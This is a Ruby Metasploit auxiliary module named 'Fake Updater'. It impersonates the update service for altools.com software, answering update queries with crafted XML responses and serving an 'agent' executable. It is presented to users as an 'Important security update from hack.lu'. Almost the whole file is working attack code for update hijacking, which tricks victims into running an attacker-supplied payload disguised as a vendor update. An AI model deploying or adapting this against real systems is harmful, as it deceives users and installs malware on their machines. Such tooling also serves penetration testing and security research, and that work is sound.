require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update


	def on_client_request_file(cli,req,conf)
		fname = File.join(Msf::Config.install_root, "data", "exploits", "update", "http", conf['file'] )
		if req.body.to_s.include? 'GetAllInformationAuth'
			conf['file'] = 'altools_GetAllInformationAuthResponse.xml'
		else
			conf['file'] = 'altools_GetEachUpdateInformationResponse.xml'
		end
		return super(cli,req,conf) 
	end
	def initialize
		super(
			'Name'        => 'Fake Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('DESCRIPTION',    [ false, "Update description shown to user.", "Important security update from hack.lu" ]),
			], self.class)
		
		@base = {	
			'vh' => ['altools.com'],
			'request' => [{
				'req' => '/UpdateService.asmx', 
				'type' => 'file', 
				'bin'    => 0,
				'parse' => 1,
				'file' => 'altools_GetAllInformationAuthResponse.xml',
			},
			{
				'req' => 'exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {  
			#todo check for random
				'description'  => { 
					'val' => datastore['description'],
					'dynamic' =>0
				},
				'md5'	=> {
					'val' => 'MD5()',
					'dynamic' => 1	
				},	       
			}
		}
	end
end
